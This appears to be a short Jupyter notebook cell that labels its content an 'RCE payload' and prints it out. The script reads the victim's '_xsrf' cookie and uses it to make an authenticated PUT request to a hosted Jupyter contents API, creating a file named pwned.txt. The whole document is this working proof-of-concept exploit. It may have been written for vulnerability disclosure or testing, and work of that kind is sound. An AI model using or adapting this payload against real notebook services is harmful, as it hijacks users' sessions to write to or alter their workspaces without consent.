# %%
# %%html
# <script>/* RCE payload */</script>
# Out:
# <script>
# function getCookie(name) {
#     var value = "; " + document.cookie;
#     var parts = value.split("; " + name + "=");
#     if (parts.length == 2) return parts.pop().split(";").shift();
#     return null;
# }
# var csrfToken = getCookie('_xsrf');
# fetch('https://' + document.domain + '/studiolab/default/jupyter/api/contents/pwned.txt', {
#     method: 'PUT',
#     headers: {
#         'Content-Type': 'application/json',
#         'X-XSRFToken': csrfToken
#     },
#     body: JSON.stringify({type: 'file', format: 'text', content: 'pwned'})
# });
# </script>
